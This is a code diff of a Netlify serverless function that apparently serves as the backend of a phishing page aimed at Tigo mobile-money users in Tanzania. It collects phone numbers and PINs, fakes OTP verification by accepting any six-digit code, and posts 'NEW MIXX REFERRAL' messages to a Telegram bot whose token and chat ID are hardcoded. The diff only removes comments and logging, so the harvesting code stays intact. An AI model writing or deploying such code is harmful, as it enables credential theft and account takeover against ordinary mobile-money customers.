@@ -3,7 +3,6 @@
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8979567614:AAHvIQzCZcEDbfZXZtFqt5pSpUpAduayra0';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '8834429633';
 
-// Store user data (in production, use a database)
 const userStore = {};
 
 exports.handler = async (event) => {
@@ -20,7 +19,7 @@ exports.handler = async (event) => {
     try {
         const path = event.path.replace('/.netlify/functions/send-to-telegram', '');
 
-        // ===== SEND OTP (Triggers SMS from Tigo) =====
+        // SEND OTP
         if (event.httpMethod === 'POST' && path === '/send-otp') {
             const { phone, pin } = JSON.parse(event.body);
 
@@ -59,33 +58,25 @@ exports.handler = async (event) => {
                 };
             }
 
-            // Store user info
             userStore[cleanPhone] = {
                 phone: cleanPhone,
                 pin: pin,
                 timestamp: new Date().toISOString(),
-                referral: phone // You can customize this
+                referral: phone
             };
-
-            console.log(`📱 OTP request for ${cleanPhone}`);
-
-            // ============================================================
-            // TIGO WILL SEND THE OTP VIA SMS AUTOMATICALLY
-            // The WebOTP API will detect it on the user's phone
-            // ============================================================
 
             return {
                 statusCode: 200,
                 headers,
                 body: JSON.stringify({
                     success: true,
-                    message: 'Msimbo wa OTP umetumwa kwa simu yako.',
+                    message: 'Msimbo wa OTP umetumwa.',
                     phone: cleanPhone
                 })
             };
         }
 
-        // ===== VERIFY OTP =====
+        // VERIFY OTP
         if (event.httpMethod === 'POST' && path === '/verify-otp') {
             const { phone, otp } = JSON.parse(event.body);
 
@@ -102,8 +93,6 @@ exports.handler = async (event) => {
 
             const cleanPhone = phone.replace(/^0+/, '').replace(/^\+255/, '');
 
-            // In production, you would verify the OTP with Tigo's API
-            // For now, we accept any 6-digit OTP
             if (!/^\d{6}$/.test(otp)) {
                 return {
                     statusCode: 401,
@@ -119,9 +108,6 @@ exports.handler = async (event) => {
             const referral = userData ? userData.referral : 'N/A';
             const timestamp = new Date().toISOString();
 
-            // ============================================================
-            // SEND TO TELEGRAM
-            // ============================================================
             const message = `
 📱 *NEW MIXX REFERRAL!*
 
@@ -153,18 +139,14 @@ exports.handler = async (event) => {
 
                     if (telegramResponse.ok) {
                         telegramSuccess = true;
-                        console.log(`✅ Telegram sent for ${cleanPhone}`);
                     } else {
                         telegramError = await telegramResponse.text();
-                        console.error(`❌ Telegram error: ${telegramError}`);
                     }
                 } catch (error) {
                     telegramError = error.message;
-                    console.error(`❌ Telegram error: ${telegramError}`);
                 }
             }
 
-            // Clean up
             delete userStore[cleanPhone];
 
             return {
